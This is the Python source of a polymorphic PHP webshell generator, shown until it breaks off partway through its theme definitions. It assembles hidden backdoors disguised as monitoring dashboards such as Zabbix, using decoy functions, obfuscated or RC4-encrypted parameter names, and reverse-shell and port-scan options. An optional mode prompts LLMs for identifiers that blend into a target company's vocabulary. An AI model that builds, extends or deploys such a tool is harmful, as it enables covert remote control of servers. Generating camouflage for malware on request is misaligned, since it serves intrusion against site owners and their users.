#!/usr/bin/env python3
"""
p0wnyShellX - Polymorphic PHP Webshell Generator
Usage: python3 p0wnyShellX.py -p MyPass -o shell.php [options]
"""
import argparse, random, string, base64, sys, subprocess
import json, os, re, urllib.error, urllib.request

VERSION = "3.0.0"

# ─────────────────────────────────────────────────────────────────────────────
# NAME POOLS
# ─────────────────────────────────────────────────────────────────────────────

PHP_FUNC_POOL = [
    "checkNodeAvailability","fetchClusterStatus","syncConfigRegistry","pruneStaleConnections",
    "rebuildServiceIndex","validateNetworkPath","queryRoutingTable","flushNodeCache",
    "updatePeerList","monitorDiskUsage","archiveSystemLogs","rotateEncryptionKeys",
    "rebalanceLoadPool","triggerHealthProbe","computeUptimeRatio","indexNetworkInterfaces",
    "resolveHostAlias","cacheDnsResponse","scheduleMaintenanceTask","validateCertificateChain",
    "purgeExpiredTokens","syncReplicaSet","checkFirewallPolicy","updateRouteAdvertisement",
    "queryNameserver","computeMonthlyRevenue","fetchBudgetAllocation","reconcileAccountLedger",
    "updateInvoiceStatus","processBatchPayment","archiveFinancialReport","validateTaxReference",
    "computeDepreciationRate","fetchExchangeRate","updateCostCenter","reconcilePurchaseOrders",
    "generateAuditTrail","calculateNetMargin","fetchAccrualBalance","postJournalEntry",
    "validateIBAN","computeVATRate","archiveFiscalYear","fetchAmortizationSchedule",
    "updateAssetRegister","fetchEmployeeRecord","processPayrollBatch","validateContractType",
    "archiveExpenseReport","syncOrgChart","computeOvertime","fetchBenefitsSummary",
    "updateAbsenceRecord","generatePaySlip","archiveHRDocument","fetchTrainingRecord",
    "updatePerformanceScore","computeBonusAmount","fetchRecruitmentPipeline",
    "collectCpuMetrics","aggregateMemoryStats","fetchNetworkThroughput","computeErrorRate",
    "archiveAlertHistory","updateThresholdConfig","fetchServiceDependency","computeP99Latency",
    "aggregateLogVolume","validateMetricSchema","fetchDashboardSnapshot","updateRetentionPolicy",
    "computeAnomalyScore","fetchTraceContext","aggregateSpanData","validateAlertRule",
    "fetchProductRecord","updateStockLevel","processTransferOrder","validateWarehouseCode",
    "archiveShipmentLog","computeInventoryDelta","fetchSupplierInfo","updateReorderPoint",
    "processReceiptNote","validateBarcodeFormat","fetchPickingList","computeShelfUtilization",
    "archivePurchaseOrder","updateLocationCode","fetchClientProfile","updateOpportunityStage",
    "processContractRenewal","validateAccountCode","archiveSupportTicket","computeChurnRate",
    "fetchLeadScore","updateContactRecord","processQuoteApproval","validateDiscountPolicy",
    "fetchCampaignMetrics","computeConversionRate","validateInputSchema","sanitizeUserPayload",
    "computeChecksumCRC32","fetchConfigValue","updateRuntimeFlag","archiveSessionRecord",
    "computeHashDigest","fetchEnvironmentVariable","updateAccessPolicy","validatePermissionSet",
    "fetchAuditRecord","computeResponseTime","registerEventCallback","deregisterEventCallback",
    "flushEventQueue","processEventBatch","validateEventSchema","archiveEventLog",
    "computeEventFrequency","fetchEventCorrelation","updateEventFilter","propagateStateChange",
    "captureStateSnapshot","restoreStateFromBackup","lockResourceHandle","releaseResourceHandle",
    "allocateBufferPool","deallocateBufferPool","resizeBufferCapacity","encodePayloadBase64",
    "decodePayloadBase64","encodePayloadHex","computeSessionFingerprint","rotateSessionKey",
    "invalidateSessionToken","validateSessionBoundary","extendSessionLifetime",
    "fetchRemoteManifest","validateManifestSignature","applyManifestPatch",
    "archiveManifestVersion","fetchDeploymentHistory","computeRiskScore","updateRiskMatrix",
    "fetchComplianceStatus","archiveAuditFinding","validateComplianceRule",
    "generateReportSummary","scheduleReportDelivery","validateReportTemplate",
    "archiveReportVersion","fetchUserPreferences","updateUserPreferences","resetUserPreferences",
    "validateUserLocale","syncUserProfile","computeGeoDistance","fetchGeoRegion",
    "validateGeoCoordinates","processWebhookPayload","validateWebhookSignature",
    "archiveWebhookEvent","retryWebhookDelivery","fetchWebhookHistory","computeTokenExpiry",
    "rotateApiKey","validateApiScope","archiveApiUsage","fetchRateLimitStatus",
    "indexDocumentRecord","searchDocumentIndex","fetchDocumentMetadata","archiveDocumentVersion",
    "validateDocumentSchema","computeBackupChecksum","validateBackupIntegrity",
    "archiveBackupManifest","restoreFromBackupSet","fetchBackupHistory",
    "processNotificationQueue","validateNotificationTemplate","retryFailedNotification",
    "fetchNotificationPreference","updateReplicaConfig","fetchReplicaLag",
    "validateReplicaConsistency","archiveReplicationLog","computeReplicationFactor",
    "fetchJobQueue","processJobEntry","validateJobPayload","archiveJobResult","computeJobPriority",
    "updateCachePolicy","fetchCacheStats","invalidateCacheEntry","archiveCacheSnapshot",
    "computeCacheHitRatio","processRetryQueue","computeBackoffDelay","validateRetryPolicy",
    "archiveRetryLog","fetchRetryHistory","fetchNetworkTopology","updateTopologyMap",
    "validateTopologyConfig","archiveTopologySnapshot","computeNetworkDiameter",
    "generateSecurityReport","validateSecurityPolicy","archiveSecurityEvent",
    "computeVulnerabilityScore","fetchThreatFeed","processDataPipeline","validatePipelineConfig",
    "archivePipelineRun","fetchPipelineStatus","computePipelineThroughput","updateSchemaVersion",
    "validateSchemaCompatibility","archiveSchemaMigration","registerHealthCheck",
    "deregisterHealthCheck","fetchHealthStatus","archiveHealthHistory","computeHealthScore",
    "submitAuditEvent","queryAuditTrail","validateAuditEntry","archiveAuditSummary",
    "computeAuditDelta","fetchServiceRegistry","registerServiceEndpoint","deregisterService",
    "validateServiceContract","archiveServiceSnapshot","computeLoadFactor","distributeWorkload",
    "balanceRequestQueue","validateBalancingPolicy","archiveLoadSnapshot","fetchCloudRegion",
    "updateRegionConfig","validateRegionEndpoint","archiveRegionSnapshot","computeRegionLatency",
    "processAlertEvent","validateAlertPayload","archiveAlertEntry","suppressAlertNoise",
    "computeAlertSeverity","fetchIncidentRecord","updateIncidentStatus","archiveIncidentLog",
    "computeIncidentMTTR","validateIncidentPriority","fetchChangeRecord","updateChangeStatus",
    "archiveChangeLog","computeChangeRisk","validateChangeCriteria","fetchProblemRecord",
    "updateProblemStatus","archiveProblemLog","fetchKnowledgeArticle","updateKnowledgeIndex",
    "archiveKnowledgeVersion","computeKnowledgeRelevance","validateKnowledgeSchema",
    "fetchCapacityForecast","updateCapacityModel","archiveCapacitySnapshot",
    "computeCapacityUtilization","validateCapacityThreshold",
]

JS_FUNC_POOL = [
    "initTerminalSession","processCommandInput","renderOutputLine","updatePromptDisplay",
    "handleKeyboardEvent","syncWorkingDirectory","buildQueryString","sendAsyncRequest",
    "processServerResponse","escapeHtmlEntities","triggerFileDownload","openFileUploadDialog",
    "readFileAsBase64","buildPromptHeader","storeCommandHistory","clearTerminalContent",
    "updateSessionContext","triggerTabCompletion","processCompletionData","decodeBase64Response",
    "attachInputHandler","dispatchInputEvent","flushOutputBuffer","refreshPromptLabel",
    "encodeFormPayload","parseJsonResponse","initScrollBehavior","captureFocusState",
    "restoreFocusState","computeShortPath",
]

JS_VAR_POOL = [
    "terminalInput","terminalOutput","currentDirectory","commandBuffer","bufferPosition",
    "sessionConfig","nodeProfile","inputElement","outputElement","pendingCommand",
    "authState","syncLock","activeSession","promptContext","cmdStore","cursorPos",
    "scrollTarget","focusTarget","sessionData","runtimeCtx",
]

HTML_ID_POOL = [
    "terminal-wrapper","output-stream","input-panel","cmd-input","prompt-label",
    "session-wrapper","console-body","cmd-field","node-prompt","exec-panel",
    "shell-viewport","log-stream","entry-field","prompt-context","runtime-console",
    "exec-input","main-terminal","sys-console","live-terminal","ops-console",
    "ctrl-surface","data-feed","session-frame","exec-surface","tty-wrapper",
]

# ─────────────────────────────────────────────────────────────────────────────
# JUNK FUNCTION BODIES
# ─────────────────────────────────────────────────────────────────────────────

def _junk_body(rng, extra_words=None):
    n1 = rng.randint(2,8); n2 = rng.randint(100,999); n3 = rng.randint(1000,9999)
    n4 = rng.randint(0,20); n5 = rng.randint(60,100)
    words_a = ['status','state','health','mode','level','tier','zone','env']
    words_b = ['ok','active','ready','stable','nominal','idle','warm','cold']
    words_c = ['node','pod','svc','app','proc','agent','task','job']
    words_d = ['cpu','mem','io','net','disk','swap','cache','buf']
    words_e = ['alpha','beta','gamma','delta','epsilon','zeta','eta','theta']
    words_f = ['running','stopped','degraded','paused','error','ready','active']
    if extra_words:
        # LLM-supplied vocabulary, spread across the literal pools
        buckets = [words_a, words_b, words_c, words_d, words_e, words_f]
        for i, w in enumerate(extra_words):
            buckets[i % len(buckets)].append(w)
    fmts = ['Y-m-d','c','U','D M j G:i:s','Y/m/d H:i']
    regions = ['eu-west','us-east','ap-south','eu-north','us-west','ap-east']

    choices = [
        (f"    $result = [];\n"
         f"    for ($i = 0; $i < {n1}; $i++) {{\n"
         f"        $result[] = rand({n2}, {n3});\n"
         f"    }}\n"
         f"    return $result;"),

        (f"    $ts = date('{rng.choice(fmts)}');\n"
         f"    $hash = md5($ts . '{n2}');\n"
         f"    return substr($hash, 0, {rng.randint(8,16)});"),

        (f"    return [\n"
         f"        '{rng.choice(words_a)}' => '{rng.choice(words_b)}',\n"
         f"        '{rng.choice(['code','ref','id','key'])}' => {n2},\n"
         f"        'ts' => time(),\n"
         f"    ];"),

        (f"    $parts = explode('-', '{n2}-{n3}-{rng.randint(10,99)}');\n"
         f"    return implode('_', array_reverse($parts));"),

        (f"    $items = array('{rng.choice(words_e)}', '{rng.choice(words_c)}');\n"
         f"    return $items[array_rand($items)] . '_{rng.randint(10,99)}';"),

        (f"    return number_format(rand({n2}, {n3}), {rng.randint(0,2)}, '.', '');"),

        (f"    $map = [];\n"
         f"    foreach (['{rng.choice(words_d)}', '{rng.choice(words_d)}'] as $k) {{\n"
         f"        $map[$k] = rand({n4}, {n5});\n"
         f"    }}\n"
         f"    return $map;"),

        (f"    if (rand(0, {rng.randint(3,9)}) === 0) {{\n"
         f"        return false;\n"
         f"    }}\n"
         f"    return str_pad('{n2}', {rng.randint(6,10)}, '0', STR_PAD_LEFT);"),

        (f"    $seconds = time() - {rng.randint(3600, 86400)};\n"
         f"    return date('Y-m-d\\\\TH:i:sP', $seconds);"),

        (f"    $statuses = ['{rng.choice(words_f)}', '{rng.choice(words_f)}', '{rng.choice(words_f)}'];\n"
         f"    return $statuses[array_rand($statuses)];"),

        (f"    $base = {rng.randint(1,100)};\n"
         f"    $factor = {rng.randint(2,10)};\n"
         f"    return round($base * $factor * (1 + (rand(0, 20) / 100)), 2);"),

        (f"    return json_encode([\n"
         f"        'version' => '{rng.randint(1,9)}.{rng.randint(0,9)}.{rng.randint(0,99)}',\n"
         f"        'build' => '{n3}',\n"
         f"        'stable' => (bool) rand(0, 1),\n"
         f"    ]);"),

        (f"    $buf = '';\n"
         f"    $charset = 'abcdef0123456789';\n"
         f"    for ($i = 0; $i < {rng.randint(16,32)}; $i++) {{\n"
         f"        $buf .= $charset[rand(0, 15)];\n"
         f"    }}\n"
         f"    return $buf;"),

        (f"    $threshold = {rng.randint(50,95)};\n"
         f"    $current = rand({rng.randint(10,40)}, {rng.randint(60,100)});\n"
         f"    return ($current > $threshold) ? 'critical' : 'normal';"),

        (f"    $delta = rand(-{rng.randint(5,20)}, {rng.randint(5,20)});\n"
         f"    $base = {rng.randint(100,10000)};\n"
         f"    return round(($base + $delta) / $base * 100 - 100, 2);"),

        (f"    return array_fill(0, rand({rng.randint(2,4)}, {rng.randint(5,10)}), null);"),

        (f"    $seed = '{rng.randint(10000,99999)}';\n"
         f"    return substr(base64_encode(hash('sha256', $seed, true)), 0, {rng.randint(12,24)});"),

        (f"    $tiers = ['{rng.choice(['Basic','Standard','Pro'])}', '{rng.choice(['Enterprise','Premium','Ultimate'])}'];\n"
         f"    return $tiers[rand(0, count($tiers) - 1)];"),

        (f"    $regions = ['{rng.choice(regions)}', '{rng.choice(regions)}'];\n"
         f"    return $regions[array_rand($regions)] . '-{rng.randint(1,9)}';"),

        (f"    return round(rand({n2}, {n3}) / {rng.randint(10,100)}, {rng.randint(1,4)});"),
    ]
    return rng.choice(choices)

def gen_junk_functions(rng, count, used_names, pool=None, extra_words=None):
    available = [n for n in (pool or PHP_FUNC_POOL) if n not in used_names]
    rng.shuffle(available)
    funcs = []
    sigs = [
        lambda fn: f"function {fn}()",
        lambda fn: f"function {fn}($data)",
        lambda fn: f"function {fn}($id, $opts = [])",
        lambda fn: f"function {fn}($name)",
        lambda fn: f"function {fn}($value, $key = null)",
        lambda fn: f"function {fn}($payload, $ctx = 'default')",
    ]
    for i in range(min(count, len(available))):
        fname = available[i]
        sig = rng.choice(sigs)(fname)
        body = _junk_body(rng, extra_words=extra_words)
        funcs.append(f"{sig} {{\n{body}\n}}\n")
    return funcs

# ─────────────────────────────────────────────────────────────────────────────
# BCRYPT HASH
# ─────────────────────────────────────────────────────────────────────────────

def compute_bcrypt_hash(password: str, cost: int = 12, seed: int = None) -> str:
    if seed is not None:
        # Derive a deterministic 22-char bcrypt salt from the seed
        salt_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./'
        salt_rng = random.Random(f"bcrypt-salt-{seed}")
        bcrypt_salt = ''.join(salt_rng.choices(salt_chars, k=22))
        php_code = f"echo crypt(getenv('__P'), '$2y${cost:02d}${bcrypt_salt}');"
    else:
        php_code = f"echo password_hash(getenv('__P'), PASSWORD_BCRYPT, ['cost' => {cost}]);"
    try:
        result = subprocess.run(
            ['php', '-r', php_code],
            capture_output=True, text=True,
            env={**__import__('os').environ, '__P': password},
            timeout=15
        )
        h = result.stdout.strip()
        if not h.startswith('$2y$'):
            raise RuntimeError(f"Unexpected hash: {h!r}")
        return h
    except FileNotFoundError:
        print("[!] php not found — falling back to hex encoding (less secure)", file=sys.stderr)
        return None

# ─────────────────────────────────────────────────────────────────────────────
# TRANSPORT LAYER
# ─────────────────────────────────────────────────────────────────────────────

# Names drawn from real-world webapp POST param pools (search, API, form handlers).
# Must not contain any plain-mode param name (cmd, cwd, filename, type, path, file)
# — mimic mode replaces those names by drawing from this pool, so overlap would
# defeat the substitution and fail the CI mimic check.
MIMIC_PARAM_POOL = [
    'q','query','search','keyword','term','text','input','filter',
    'dir','ctx','context','scope','ref','source',
    'action','event','op','mode','view','sort','lang','locale',
    'data','payload','body','content','value','field','attr','prop',
    'token','nonce','sig','key','sid','fmt','charset','region',
]

def generate_transport_context(rng: random.Random, mode: str, param_pool: list | None = None) -> dict:
    if mode == 'plain':
        return {
            'p_cmd': 'cmd', 'p_cwd': 'cwd',
            'p_filename': 'filename', 'p_filetype': 'type',
            'p_path': 'path', 'p_file': 'file',
            'p_ip': 'ip', 'p_port_rs': 'port',
            'p_logfile': 'logfile', 'p_pattern': 'pattern',
            'p_target': 'target', 'p_ports_ps': 'ports',
            'p_mode': 'scan_mode', 'p_timeout': 'scan_timeout',
            'p_pause': 'scan_pause', 'p_rs_method': 'rs_method',
            'p_ps_probe': 'ps_probe',
        }
    pool = list(param_pool or MIMIC_PARAM_POOL)
    rng.shuffle(pool)
    ctx = {
        'p_cmd': pool[0], 'p_cwd': pool[1],
        'p_filename': pool[2], 'p_filetype': pool[3],
        'p_path': pool[4], 'p_file': pool[5],
        'p_ip': pool[6], 'p_port_rs': pool[7],
        'p_logfile': pool[8], 'p_pattern': pool[9],
        'p_target': pool[10], 'p_ports_ps': pool[11],
        'p_mode': pool[12], 'p_timeout': pool[13],
        'p_pause': pool[14], 'p_rs_method': pool[15],
        'p_ps_probe': pool[16],
    }
    if mode == 'rc4':
        rc4_bytes = [rng.randint(0, 255) for _ in range(16)]
        alpha = list('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')
        rng.shuffle(alpha)
        ctx.update({
            'rc4_key_hex':   ''.join(f'{b:02x}' for b in rc4_bytes),
            'rc4_key_bytes': rc4_bytes,
            'b64_alpha':     ''.join(alpha),
        })
    return ctx

# ─────────────────────────────────────────────────────────────────────────────
# OPTIONAL LLM AUGMENTATION (opt-in via --llm; stdlib only; silent fallback)
# ─────────────────────────────────────────────────────────────────────────────
#
# Design rule: the LLM only ever produces *atoms* — identifiers and string
# literals. Every candidate is regex-validated before it may enter a pool, so
# a hallucinated brace or a prose answer can never reach the output file, and
# the functional core of the shell stays reviewed template code. Any network,
# auth or parse failure falls back to the static pools silently: a build with
# --llm can degrade, it can never break.

_LLM_DEFAULT_MODELS = {
    "ollama":    "llama3.2",
    "deepseek":  "deepseek-chat",
    "anthropic": "claude-haiku-4-5-20251001",
    "openai":    "gpt-4o-mini",
    "kimi":      "moonshot-v1-8k",
}
_LLM_ENV_KEYS = {
    "deepseek":  "DEEPSEEK_API_KEY",
    "anthropic": "ANTHROPIC_API_KEY",
    "openai":    "OPENAI_API_KEY",
    "kimi":      "MOONSHOT_API_KEY",
}
_LLM_ENDPOINTS = {  # OpenAI-compatible chat APIs
    "deepseek": "https://api.deepseek.com/v1",
    "openai":   "https://api.openai.com/v1",
    "kimi":     "https://api.moonshot.cn/v1",
}

_IDENT_RE   = re.compile(r'^[a-z][a-zA-Z0-9]{2,39}$')       # camelCase function names
_PARAM_RE   = re.compile(r'^[a-z][a-z0-9_]{1,19}$')         # POST parameter names
_APPNAME_RE = re.compile(r'^[A-Z][A-Za-z0-9 &\'_.-]{2,39}$')  # "FleetOps Console"
_WORD_RE    = re.compile(r'^[a-z][a-z0-9-]{2,19}$')         # junk literal words

_LLM_VALIDATORS = {
    'func_names':   _IDENT_RE,
    'app_names':    _APPNAME_RE,
    'mimic_params': _PARAM_RE,
    'junk_words':   _WORD_RE,
}

# Substrings that would *hurt* camouflage if they appeared in an identifier —
# an LLM asked for "believable" names sometimes produces telltale ones.
_LLM_DENY_SUBSTRINGS = (
    'shell', 'payload', 'backdoor', 'exploit', 'passwd', 'password',
    'base64', 'malware', 'hack', 'cmd', 'exec', 'c2', 'webshell',
)

# Rotating framings per category — the model sees varied requests, which
# improves diversity across builds (same trick as batforge/powershellforge).
_LLM_PROMPTS = {
    'func_names': [
        'Return {n} plausible camelCase PHP function names for internal business/IT tooling{ctx}. '
        'Verb-noun style, like archiveReplicationLog or fetchComplianceStatus. '
        'Respond with a JSON array of strings only.',
        'List {n} realistic camelCase function names you would find in a company internal dashboard{ctx}. '
        'Professional verb-noun naming. JSON array of strings, no explanation.',
        'Generate {n} credible camelCase backend function names for an internal ops tool{ctx}. '
        'Each 2-4 words joined, lowerCamelCase. JSON string array only.',
    ],
    'app_names': [
        'Return {n} plausible names for an internal infrastructure monitoring web console{ctx}. '
        'Title Case, 2-3 words, like "Cluster Console" or "Node Inspector". JSON array of strings only.',
        'List {n} credible internal ops dashboard product names{ctx}. '
        'Short Title Case names, no version numbers. JSON array only.',
    ],
    'mimic_params': [
        'Return {n} short lowercase HTTP POST parameter names a web application would use{ctx}. '
        'Single words or snake_case, like query, payload or shipment_ref. JSON array of strings only.',
        'List {n} common webapp form/API field names{ctx}. '
        'Lowercase, short, realistic. JSON string array only.',
    ],
    'junk_words': [
        'Return {n} plausible lowercase technical words used in config values and status strings '
        'of internal IT tooling{ctx}. Single words, like nominal, relay or eu-west. JSON array only.',
        'List {n} terse ops/status vocabulary words{ctx}. '
        'Lowercase single words, varied domains (infra, deploy, network). JSON array only.',
    ],
}


def _llm_context_clause(company: str | None, context: str | None) -> str:
    """Build the target-context sentence appended to every prompt."""
    parts = []
    if company:
        parts.append(f'the organization "{company.strip()}"')
    if context:
        parts.append(f'({context.strip()})')
    if not parts:
        return ''
    return (' for ' + ' '.join(parts) +
            ' — they must blend into its internal vocabulary (industry jargon, business domain),'
            ' as if written by its own developers')


def _parse_llm_list(text: str) -> list[str]:
    """Extract a string list from an LLM response regardless of formatting."""
    text = re.sub(r"```(?:json|JSON)?\s*", "", text)
    text = re.sub(r"```\s*", "", text).strip()
    try:
        parsed = json.loads(text)
        if isinstance(parsed, list):
            return [s for x in parsed if (s := str(x).strip()) and not s.startswith(("{", "["))]
    except json.JSONDecodeError:
        pass
    m = re.search(r"\[.*?\]", text, re.DOTALL)
    if m:
        try:
            parsed = json.loads(m.group())
            if isinstance(parsed, list):
                return [s for x in parsed if (s := str(x).strip()) and not s.startswith(("{", "["))]
        except json.JSONDecodeError:
            pass
    lines = []
    for raw in text.splitlines():
        line = raw.strip()
        line = re.sub(r"^[\d]+[.)]\s*", "", line)
        line = line.strip("-*•·").strip('"').strip("'").strip(",").strip()
        if line and not line.startswith(("[", "]", "{")) and len(line) > 1:
            lines.append(line)
    return lines


def _llm_call_ollama(prompt: str, model: str) -> str:
    base = os.environ.get("OLLAMA_HOST", "http://localhost:11434").rstrip('/')
    payload = json.dumps({
        "model": model, "prompt": prompt, "stream": False,
        "options": {"temperature": 0.9, "num_predict": 512},
    }).encode()
    req = urllib.request.Request(f"{base}/api/generate", data=payload,
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read()).get("response", "")


def _llm_call_openai_compat(prompt: str, model: str, api_key: str, base_url: str) -> str:
    payload = json.dumps({
        "model": model,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.9, "max_tokens": 512,
    }).encode()
    req = urllib.request.Request(f"{base_url.rstrip('/')}/chat/completions", data=payload,
                                 headers={"Content-Type": "application/json",
                                          "Authorization": f"Bearer {api_key}"}, method="POST")
    with urllib.request.urlopen(req, timeout=60) as resp:
        data = json.loads(resp.read())
    return data["choices"][0]["message"]["content"]


def _llm_call_anthropic(prompt: str, model: str, api_key: str) -> str:
    payload = json.dumps({
        "model": model, "max_tokens": 512,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=payload,
                                 headers={"Content-Type": "application/json",
                                          "x-api-key": api_key,
                                          "anthropic-version": "2023-06-01"}, method="POST")
    with urllib.request.urlopen(req, timeout=60) as resp:
        data = json.loads(resp.read())
    return data["content"][0]["text"]


class LLMProvider:
    """Optional LLM backend for pool augmentation. Instantiate once per build.

    variants() returns validated, deduplicated atoms — or an empty list on any
    failure (caller then just uses the static pools). Results are cached per
    category, so one build costs at most one request per category.
    """

    def __init__(self, spec: str, company: str | None = None, context: str | None = None):
        parts = (spec or "").split(":", 1)
        self.provider = parts[0].lower().strip()
        if self.provider not in _LLM_DEFAULT_MODELS:
            raise ValueError(f"Unknown LLM provider {self.provider!r}. "
                             f"Valid: {', '.join(_LLM_DEFAULT_MODELS)}")
        self.model = parts[1] if len(parts) > 1 and parts[1] else _LLM_DEFAULT_MODELS[self.provider]
        self.ctx_clause = _llm_context_clause(company, context)
        self._cache: dict[str, list[str]] = {}

    def _raw(self, prompt: str) -> str:
        if self.provider == "ollama":
            return _llm_call_ollama(prompt, self.model)
        if self.provider == "anthropic":
            return _llm_call_anthropic(prompt, self.model, os.environ.get("ANTHROPIC_API_KEY", ""))
        key = os.environ.get(_LLM_ENV_KEYS[self.provider], "")
        return _llm_call_openai_compat(prompt, self.model, key, _LLM_ENDPOINTS[self.provider])

    def variants(self, category: str, n: int, rng: random.Random,
                 exclude: set[str] | None = None) -> list[str]:
        """Up to n validated atoms for the category. Empty list on any failure."""
        if category not in _LLM_PROMPTS:
            return []
        key = f"{category}:{n}"
        if key not in self._cache:
            prompt = rng.choice(_LLM_PROMPTS[category]).format(n=n, ctx=self.ctx_clause)
            try:
                raw = self._raw(prompt)
                candidates = _parse_llm_list(raw)
            except (urllib.error.URLError, KeyError, json.JSONDecodeError, OSError, IndexError):
                candidates = []
            validator = _LLM_VALIDATORS[category]
            seen = set(exclude or ())
            ok = []
            for c in candidates:
                c = c.strip()
                if (validator.match(c) and c not in seen
                        and not any(bad in c.lower() for bad in _LLM_DENY_SUBSTRINGS)):
                    seen.add(c)
                    ok.append(c)
            self._cache[key] = ok
        return self._cache[key]


# ─────────────────────────────────────────────────────────────────────────────
# CSS THEMES
# ─────────────────────────────────────────────────────────────────────────────

# Real themes: picked by random when --theme is omitted. 'poly' and 'none' are excluded from the random pool.
CSS_THEMES = {
    "infra-dark": {
        "app_name": "Resource Monitor", "version_prefix": "v",
        "body_bg": "#1b1c1d", "body_fg": "#e6e6e6",
        "shell_bg": "radial-gradient(ellipse at center, #1a1a1a 0%, #121212 100%)",
        "shell_border": "#3c3c3c", "shell_glow": "rgba(0,255,0,0.07)",
        "stream_fg": "#e0e0e0", "prompt_fg": "#91ff00", "prompt_host_fg": "#21c7ff",
        "header_fg": "#ff557a", "header_shadow": "#ff1f5c77",
        "entry_bg": "#1e1e1e", "entry_border": "rgba(255,255,255,.05)",
        "input_fg": "#fff",
        "form_bg": "#272727", "form_border": "#3a3a3a",
        "input_bg": "#191919", "input_border": "#444", "input_fg2": "#ddd",
        "btn_bg": "#50fa7b", "btn_fg": "#111",
        "error_fg": "#ff557a", "note_fg": "#888",
        "scroll_track": "#2a2a2a", "scroll_thumb": "#888",
    },
    "corporate-blue": {
        "app_name": "InfraOps Console", "version_prefix": "build-",
        "body_bg": "#0d1117", "body_fg": "#c9d1d9",
        "shell_bg": "radial-gradient(ellipse at center, #0d1b2a 0%, #070d14 100%)",
        "shell_border": "#30363d", "shell_glow": "rgba(56,139,253,0.08)",
        "stream_fg": "#c9d1d9", "prompt_fg": "#79c0ff", "prompt_host_fg": "#58a6ff",
        "header_fg": "#388bfd", "header_shadow": "#388bfd44",
        "entry_bg": "#161b22", "entry_border": "rgba(48,54,61,.8)",
        "input_fg": "#c9d1d9",
        "form_bg": "#161b22", "form_border": "#30363d",
        "input_bg": "#0d1117", "input_border": "#30363d", "input_fg2": "#c9d1d9",
        "btn_bg": "#1f6feb", "btn_fg": "#ffffff",
        "error_fg": "#f85149", "note_fg": "#8b949e",
        "scroll_track": "#161b22", "scroll_thumb": "#484f58",
    },
    "matrix": {
        "app_name": "SysCore Terminal", "version_prefix": "r",
        "body_bg": "#000000", "body_fg": "#00ff41",
        "shell_bg": "radial-gradient(ellipse at center, #001400 0%, #000000 100%)",
        "shell_border": "#004400", "shell_glow": "rgba(0,255,65,0.12)",
        "stream_fg": "#00cc33", "prompt_fg": "#00ff41", "prompt_host_fg": "#00cc33",
        "header_fg": "#00ff41", "header_shadow": "#00ff4133",
        "entry_bg": "#001100", "entry_border": "rgba(0,68,0,.8)",
        "input_fg": "#00ff41",
        "form_bg": "#001a00", "form_border": "#004400",
        "input_bg": "#000a00", "input_border": "#004400", "input_fg2": "#00cc33",
        "btn_bg": "#003300", "btn_fg": "#00ff41",
        "error_fg": "#ff0000", "note_fg": "#006600",
        "scroll_track": "#001100", "scroll_thumb": "#006600",
    },
    # ── Zabbix monitoring dashboard camouflage ──
    "zabbix": {
        "app_name": "Zabbix Frontend", "version_prefix": "v",
        "body_bg": "#0f1318", "body_fg": "#c3ccd6",
        "shell_bg": "radial-gradient(ellipse at center, #131b26 0%, #0b0f15 100%)",
        "shell_border": "#1e2d40", "shell_glow": "rgba(209,79,43,0.08)",
        "stream_fg": "#b8c5d0", "prompt_fg": "#d14f2b", "prompt_host_fg": "#5ba3c9",
        "header_fg": "#d14f2b", "header_shadow": "#d14f2b44",
        "entry_bg": "#111820", "entry_border": "rgba(30,45,64,.8)",
        "input_fg": "#c3ccd6",
        "form_bg": "#131b26", "form_border": "#1e2d40",
        "input_bg": "#0b0f15", "input_border": "#1e2d40", "input_fg2": "#b8c5d0",
        "btn_bg": "#d14f2b", "btn_fg": "#ffffff",
        "error_fg": "#e05c3b", "note_fg": "#4a5a6b",
        "scroll_track": "#111820", "scroll_thumb": "#2a3d52",
    },
    # ── Watch Dogs ctOS cold blue-green palette ──
    "ctos": {
        "app_name": "ctOS Interface", "version_prefix": "v",
        "body_bg": "#09131c", "body_fg": "#00d4e8",
        "shell_bg": "radial-gradient(ellipse at center, #0d1a25 0%, #060e15 100%)",
        "shell_border": "#005f6e", "shell_glow": "rgba(0,213,232,0.10)",
        "stream_fg": "#00bcd4", "prompt_fg": "#00ff7f", "prompt_host_fg": "#00d4e8",
        "header_fg": "#00d4e8", "header_shadow": "#00d4e844",
        "entry_bg": "#0b1720", "entry_border": "rgba(0,95,110,.8)",
        "input_fg": "#00d4e8",
        "form_bg": "#0d1a25", "form_border": "#005f6e",
        "input_bg": "#060e15", "input_border": "#005f6e", "input_fg2": "#00bcd4",
        "btn_bg": "#006b7a", "btn_fg": "#00d4e8",
        "error_fg": "#ff4444", "note_fg": "#005060",
        "scroll_track": "#0b1720", "scroll_thumb": "#005f6e",
    },
    # ── Mr. Robot / fsociety — dark mono with red accent ──
    "fsociety": {
        "app_name": "Secure Shell", "version_prefix": "v",
        "body_bg": "#0d0d0d", "body_fg": "#d0d0d0",
        "shell_bg": "radial-gradient(ellipse at center, #111111 0%, #080808 100%)",
        "shell_border": "#2a0a0a", "shell_glow": "rgba(204,34,0,0.10)",
        "stream_fg": "#c0c0c0", "prompt_fg": "#cc2200", "prompt_host_fg": "#999999",
        "header_fg": "#cc2200", "header_shadow": "#cc220044",
        "entry_bg": "#111111", "entry_border": "rgba(42,10,10,.8)",
        "input_fg": "#d0d0d0",
        "form_bg": "#111111", "form_border": "#2a0a0a",
        "input_bg": "#080808", "input_border": "#2a0a0a", "input_fg2": "#c0c0c0",
        "btn_bg": "#cc2200", "btn_fg": "#ffffff",
        "error_fg": "#ff3300", "note_fg": "#555555",
        "scroll_track": "#111111", "scroll_thumb": "#3a0a0a",
    },
    # ── Russian tricolor (white/blue/red) palette ──
    "russia": {
        "app_name": "Federal Monitor", "version_prefix": "v",
        "body_bg": "#0a0a14", "body_fg": "#e8e8f0",
        "shell_bg": "radial-gradient(ellipse at center, #0e0e1e 0%, #070710 100%)",
        "shell_border": "#1a1a2e", "shell_glow": "rgba(204,0,0,0.09)",
        "stream_fg": "#d8d8e8", "prompt_fg": "#cc0000", "prompt_host_fg": "#4466cc",
        "header_fg": "#cc0000", "header_shadow": "#cc000044",
        "entry_bg": "#0c0c1a", "entry_border": "rgba(26,26,46,.8)",
